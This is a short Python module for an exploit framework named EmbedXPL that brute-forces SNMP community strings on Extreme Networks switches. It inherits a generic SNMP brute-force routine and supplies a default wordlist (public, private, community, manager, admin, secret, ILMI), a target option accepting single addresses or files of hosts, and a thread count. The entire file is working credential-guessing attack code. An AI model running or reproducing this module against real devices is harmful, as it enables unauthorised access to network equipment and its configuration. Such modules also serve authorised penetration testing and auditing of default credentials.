# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.snmp_bruteforce import Exploit as SNMPBruteforce


class Exploit(SNMPBruteforce):
    """Extreme Networks Switch — Default SNMP Community Strings.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Extreme Networks Switch Default SNMP Community Strings",
        "description": (
            "Module performs dictionary attack against Extreme Networks Switch SNMP service "
            "using known default community strings. "
            "If valid community strings are found, they are displayed to the user."
        ),
        "authors": (
            "André Henrique (@mrhenrike) — EmbedXPL-Forge",
        ),
        "devices": (
            "Extreme Networks Switch",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(161, "Target SNMP port")

    threads = OptInteger(4, "Number of threads")
    defaults = OptWordlist("public,private,community,manager,admin,secret,ILMI", "Community strings to try")
    stop_on_success = OptBool(False, "Stop on first valid community string")
    verbosity = OptBool(True, "Display attempts")
